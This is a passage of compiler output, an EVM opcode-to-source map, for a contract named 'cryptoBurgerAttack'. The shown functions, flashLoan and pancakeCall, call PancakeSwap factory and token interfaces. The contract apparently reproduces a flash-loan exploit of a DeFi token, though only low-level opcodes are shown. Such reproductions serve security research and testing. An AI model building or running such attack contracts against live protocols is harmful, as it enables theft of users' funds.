      "value": "0x18160DDD"
    },
    "9761": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "9763": {
      "op": "SHL"
    },
    "9764": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9765": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9766": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9767": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9768": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "9770": {
      "op": "DUP1"
    },
    "9771": {
      "op": "MLOAD"
    },
    "9772": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9774": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "9777": {
      "op": "DUP4"
    },
    "9778": {
      "op": "CODECOPY"
    },
    "9779": {
      "op": "DUP2"
    },
    "9780": {
      "op": "MLOAD"
    },
    "9781": {
      "op": "SWAP2"
    },
    "9782": {
      "op": "MSTORE"
    },
    "9783": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "9784": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9786": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9788": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "9790": {
      "op": "SHL"
    },
    "9791": {
      "op": "SUB"
    },
    "9792": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12074
      ],
      "op": "AND",
      "path": "0"
    },
    "9793": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12074
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9794": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12086
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x18160DDD"
    },
    "9799": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12086
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9800": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "9802": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9803": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP4",
      "path": "0"
    },
    "9804": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "ADD",
      "path": "0"
    },
    "9805": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "9806": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "9808": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "9809": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9810": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9811": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9812": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9813": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SUB",
      "path": "0"
    },
    "9814": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "ADD",
      "path": "0"
    },
    "9815": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9816": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12074
      ],
      "op": "DUP7",
      "path": "0"
    },
    "9817": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "GAS",
      "path": "0"
    },
    "9818": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "9819": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9820": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9821": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9822": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x266B"
    },
    "9825": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "9826": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9827": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9829": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9830": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "9831": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9832": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9834": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "REVERT",
      "path": "0"
    },
    "9835": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9836": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "POP",
      "path": "0"
    },
    "9837": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "POP",
      "path": "0"
    },
    "9838": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "POP",
      "path": "0"
    },
    "9839": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "POP",
      "path": "0"
    },
    "9840": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9842": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9843": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9844": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9846": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "NOT",
      "path": "0"
    },
    "9847": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9849": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9850": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "ADD",
      "path": "0"
    },
    "9851": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "AND",
      "path": "0"
    },
    "9852": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9853": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "ADD",
      "path": "0"
    },
    "9854": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9855": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9857": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9858": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "POP",
      "path": "0"
    },
    "9859": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9860": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "ADD",
      "path": "0"
    },
    "9861": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9862": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x268F"
    },
    "9865": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9866": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9867": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "9870": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        12058,
        12088
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9871": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9872": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9874": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9875": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x26CB"
    },
    "9878": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9879": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9880": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "9882": {
      "op": "DUP1"
    },
    "9883": {
      "op": "DUP3"
    },
    "9884": {
      "op": "MSTORE"
    },
    "9885": {
      "op": "PUSH1",
      "value": "0x12"
    },
    "9887": {
      "op": "SWAP1"
    },
    "9888": {
      "op": "DUP3"
    },
    "9889": {
      "op": "ADD"
    },
    "9890": {
      "op": "MSTORE"
    },
    "9891": {
      "op": "PUSH18",
      "value": "0x2A37BA30B610212AA9239039BAB838363C9"
    },
    "9910": {
      "op": "PUSH1",
      "value": "0x75"
    },
    "9912": {
      "op": "SHL"
    },
    "9913": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "9915": {
      "op": "DUP3"
    },
    "9916": {
      "op": "ADD"
    },
    "9917": {
      "op": "MSTORE"
    },
    "9918": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9920": {
      "op": "DUP2"
    },
    "9921": {
      "op": "ADD"
    },
    "9922": {
      "op": "SWAP2"
    },
    "9923": {
      "op": "SWAP1"
    },
    "9924": {
      "op": "SWAP2"
    },
    "9925": {
      "op": "MSTORE"
    },
    "9926": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "9928": {
      "op": "ADD"
    },
    "9929": {
      "op": "SWAP1"
    },
    "9930": {
      "op": "JUMP"
    },
    "9931": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9932": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9934": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9935": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9936": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9937": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "SUB",
      "path": "0"
    },
    "9938": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9939": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12032,
        12089
      ],
      "op": "LOG1",
      "path": "0"
    },
    "9940": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9941": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9942": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9943": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9944": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9945": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9946": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9947": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9948": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9949": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2079,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9950": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9951": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9952": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9953": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9954": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "POP",
      "path": "0"
    },
    "9955": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "o",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9956": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9957": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9959": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9960": {
      "op": "PUSH4",
      "value": "0xE6A43905"
    },
    "9965": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "9967": {
      "op": "SHL"
    },
    "9968": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9969": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9970": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9972": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9974": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "9976": {
      "op": "SHL"
    },
    "9977": {
      "op": "SUB"
    },
    "9978": {
      "op": "DUP4"
    },
    "9979": {
      "op": "AND"
    },
    "9980": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "9982": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9983": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "ADD",
      "path": "0"
    },
    "9984": {
      "op": "MSTORE"
    },
    "9985": {
      "offset": [
        895,
        937
      ],
      "op": "PUSH20",
      "path": "0",
      "value": "0x8AC76A51CC950D9822D68B83FE1AD97B32CD580D"
    },
    "10006": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "10008": {
      "op": "DUP3"
    },
    "10009": {
      "op": "ADD"
    },
    "10010": {
      "op": "MSTORE"
    },
    "10011": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1297,
        1309
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10013": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1297,
        1309
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10014": {
      "offset": [
        631,
        673
      ],
      "op": "PUSH20",
      "path": "0",
      "value": "0xCA143CE32FE78F1F7019D7D551A6402FC5350C73"
    },
    "10035": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        631,
        673
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10036": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1357
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xE6A43905"
    },
    "10041": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1357
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10042": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "10044": {
      "op": "ADD"
    },
    "10045": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10047": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10049": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10050": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10051": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10052": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "SUB",
      "path": "0"
    },
    "10053": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10054": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP7",
      "path": "0"
    },
    "10055": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "GAS",
      "path": "0"
    },
    "10056": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "10057": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10058": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10059": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10060": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2759"
    },
    "10063": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10064": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10065": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10067": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10068": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "10069": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10070": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10072": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "REVERT",
      "path": "0"
    },
    "10073": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10074": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "POP",
      "path": "0"
    },
    "10075": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "POP",
      "path": "0"
    },
    "10076": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "POP",
      "path": "0"
    },
    "10077": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "POP",
      "path": "0"
    },
    "10078": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10080": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10081": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10082": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10084": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "NOT",
      "path": "0"
    },
    "10085": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10087": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10088": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "ADD",
      "path": "0"
    },
    "10089": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "AND",
      "path": "0"
    },
    "10090": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10091": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "ADD",
      "path": "0"
    },
    "10092": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10093": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10095": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10096": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "POP",
      "path": "0"
    },
    "10097": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10098": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "ADD",
      "path": "0"
    },
    "10099": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10100": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x277D"
    },
    "10103": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "10104": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10105": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C59"
    },
    "10108": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "jump": "i",
      "offset": [
        1312,
        1411
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10109": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1312,
        1411
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10110": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1297,
        1411
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10111": {
      "op": "POP"
    },
    "10112": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10114": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10116": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10118": {
      "op": "SHL"
    },
    "10119": {
      "op": "SUB"
    },
    "10120": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1462,
        1480
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 96
    },
    "10121": {
      "branch": 106,
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1462,
        1480
      ],
      "op": "AND",
      "path": "0"
    },
    "10122": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x27CC"
    },
    "10125": {
      "branch": 106,
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10126": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10128": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10129": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "10133": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "10135": {
      "op": "SHL"
    },
    "10136": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10137": {
